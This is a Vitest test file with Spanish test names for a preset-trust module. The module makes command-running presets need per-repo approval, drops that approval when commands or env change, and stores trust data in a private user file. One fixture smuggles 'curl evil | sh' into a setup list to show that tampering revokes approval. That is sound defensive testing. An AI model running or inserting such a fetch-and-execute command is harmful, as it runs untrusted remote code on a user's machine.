import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { writeFileSync, statSync } from 'fs'
import { join } from 'path'
import { makeTmpDir, cleanupTmp } from './setup'
import { PresetTrust, hashDePreset, ejecutaAlgo } from '../preset-trust'
import type { RavenPreset } from '../../src/types'

const INSTALAR: RavenPreset = { id: 'setup', name: 'Install dependencies', setup: ['npm install'], env: { PORT: '3000', A: 'b' } }

describe('PresetTrust', () => {
  let home: string
  let trust: PresetTrust
  beforeEach(() => { home = makeTmpDir('raven-trust-'); trust = new PresetTrust(home) })
  afterEach(() => cleanupTmp(home))

  it('un preset que ejecuta algo no está aprobado hasta que se aprueba', () => {
    expect(trust.estaAprobado('/repo', INSTALAR)).toBe(false)
    trust.aprobar('/repo', INSTALAR)
    expect(trust.estaAprobado('/repo', INSTALAR)).toBe(true)
  })

  it('la aprobación es por repo: el mismo preset en otro repo vuelve a preguntar', () => {
    trust.aprobar('/repo', INSTALAR)
    expect(trust.estaAprobado('/otro', INSTALAR)).toBe(false)
  })

  it('cambiar un comando, el dev o el env la invalida; cambiar el nombre no', () => {
    trust.aprobar('/repo', INSTALAR)
    expect(trust.estaAprobado('/repo', { ...INSTALAR, setup: ['npm install', 'curl evil | sh'] })).toBe(false)
    expect(trust.estaAprobado('/repo', { ...INSTALAR, dev: 'node x.js' })).toBe(false)
    expect(trust.estaAprobado('/repo', { ...INSTALAR, env: { PORT: '4000', A: 'b' } })).toBe(false)
    expect(trust.estaAprobado('/repo', { ...INSTALAR, name: 'Otro nombre', description: 'x' })).toBe(true)
  })

  it('el hash no depende del orden de las claves del env', () => {
    expect(hashDePreset({ ...INSTALAR, env: { A: 'b', PORT: '3000' } })).toBe(hashDePreset(INSTALAR))
  })

  it('un preset que no ejecuta nada no necesita aprobación', () => {
    const soloPuertos: RavenPreset = { id: 'p', name: 'Ports', ports: [3000] }
    expect(ejecutaAlgo(soloPuertos)).toBe(false)
    expect(trust.estaAprobado('/repo', soloPuertos)).toBe(true)
  })

  it('vive fuera del repo, sólo para el usuario, y un archivo roto no aprueba nada', () => {
    trust.aprobar('/repo', INSTALAR)
    const archivo = join(home, 'preset-trust.json')
    if (process.platform !== 'win32') expect(statSync(archivo).mode & 0o777).toBe(0o600)
    writeFileSync(archivo, '{roto')
    expect(trust.estaAprobado('/repo', INSTALAR)).toBe(false)
  })
})
